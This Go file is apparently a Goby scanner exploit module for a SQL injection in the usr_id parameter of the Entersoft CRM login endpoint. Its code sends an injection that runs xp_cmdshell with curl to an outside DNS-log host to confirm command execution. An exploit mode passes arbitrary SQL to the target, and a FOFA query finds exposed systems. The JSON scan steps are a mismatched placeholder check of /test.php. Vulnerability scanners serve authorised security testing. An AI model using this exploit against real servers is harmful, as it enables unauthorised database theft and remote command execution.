package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Entersoft LoginDoAction.entcrm SQL injection vulnerability",
    "Description": "<p>Zhejiang University Ente customer resource management system is a customer resource management system that integrates process-based, digital-intelligent, and platform-based functions.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
    "Product": "Zhejiang-Duite-Customer-Resource-MS",
    "Homepage": "http://www.entersoft.cn/",
    "DisclosureDate": "2023-02-22",
    "Author": "heiyeleng",
    "FofaQuery": "title=\"欢迎使用浙大恩特客户资源管理系统\"",
    "GobyQuery": "title=\"欢迎使用浙大恩特客户资源管理系统\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1.The manufacturer has not released a vulnerability patch yet. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "and 1=1",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "浙大恩特客户资源管理系统 LoginDoAction.entcrm 文件 usr_id 参数 SQL 注入漏洞",
            "Product": "浙大恩特客户资源管理系统",
            "Description": "<p>浙大恩特客户资源管理系统是一款集流程化、数智化、平台化等功能于一体的客户资源管理系统。<br></p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、厂商暂未发布漏洞补丁，请关注厂商主页及时获取更新：<a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a>。</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Entersoft LoginDoAction.entcrm SQL injection vulnerability",
            "Product": "Zhejiang-Duite-Customer-Resource-MS",
            "Description": "<p>Zhejiang University Ente customer resource management system is a customer resource management system that integrates process-based, digital-intelligent, and platform-based functions.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
            "Recommendation": "<p>1.The manufacturer has not released a vulnerability patch yet. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a><br></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-02",
    "PocId": "9960"
}`
	doDnslog23jsdfi := func(hostInfo *httpclient.FixUrl, sql string) bool {
		var cfg *httpclient.RequestConfig
		var checkStr string
		if sql == "" {
			checkStr = goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cfg = httpclient.NewGetRequestConfig("/entsoft/ep/LoginDoAction.entcrm?method=logon&autoLog=false&cst_id=&code=&formID=EnterCRM&w_state=1728&formName=CRM&usr_id=';exec+xp_cmdshell+'curl+" + checkUrl + "'--&password=4297f44b13955235245b2497399d7a93&language=zh-cn&checkImg=&IscheckImg=false&txtMACAddr=")
		} else {
			sql = url.QueryEscape(sql)
			cfg = httpclient.NewGetRequestConfig("/entsoft/ep/LoginDoAction.entcrm?method=logon&autoLog=false&cst_id=&code=&formID=EnterCRM&w_state=1728&formName=CRM&usr_id=1'" + sql + "'--&password=4297f44b13955235245b2497399d7a93&language=zh-cn&checkImg=&IscheckImg=false&txtMACAddr=")
		}
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, cfg); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "账号不存在") {
				if sql != "" {
					return true
				} else {
					return godclient.PullExists(checkStr, time.Second*15)
				}
			}
		}
		return false
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if doDnslog23jsdfi(hostInfo, "") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				expResult.Success = doDnslog23jsdfi(expResult.HostInfo, sql)
				expResult.Output = "漏洞利用成功"
			case "sqlPoint":
				expResult.Success = true
				expResult.Output = "GET /entsoft/ep/LoginDoAction.entcrm?method=logon&autoLog=false&cst_id=&code=&formID=EnterCRM&w_state=1728&formName=CRM&usr_id=1'and+1%3D1'--&password=4297f44b13955235245b2497399d7a93&language=zh-cn&checkImg=&IscheckImg=false&txtMACAddr= HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\nAccept-Encoding: gzip, deflate\nConnection: close\n\n"
			}
			return expResult
		},
	))
}
